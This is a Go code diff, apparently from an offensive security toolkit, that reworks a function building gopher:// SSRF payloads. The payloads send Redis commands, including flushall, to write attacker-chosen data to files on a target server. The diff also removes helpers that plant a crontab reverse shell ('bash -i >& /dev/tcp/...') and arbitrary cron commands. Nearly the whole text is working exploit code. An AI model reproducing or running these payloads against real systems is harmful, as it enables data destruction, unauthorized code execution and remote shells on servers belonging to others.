@@ -6,10 +6,9 @@ import (
 	"strings"
 
 	"github.com/virzz/logger"
-	"github.com/virzz/virzz/utils"
 )
 
-func expRedisCmd(addr, path, name, data string) (string, error) {
+func GopherRedisWriteExp(addr, path, name, data string) (string, error) {
 	logger.Debug("path: ", path, "name: ", name, "data: ", data)
 	ps := []string{
 		"*1", "$8", "flushall",
@@ -22,18 +21,4 @@ func expRedisCmd(addr, path, name, data string) (string, error) {
 	}
 	p := url.QueryEscape(strings.Join(ps, "\r\n"))
 	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
-}
-
-func expRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
-	ip, port, err := utils.ParseAddr(reverseAddr)
-	if err != nil {
-		return "", err
-	}
-	cmd := fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n\n\n", ip, port)
-	return expRedisCmd(addr, path, name, cmd)
-}
-
-func expRedisCrontabFile(addr, path, name, cmd string) (string, error) {
-	cmd = fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"%s\"\n\n\n\n", cmd)
-	return expRedisCmd(addr, path, name, cmd)
 }
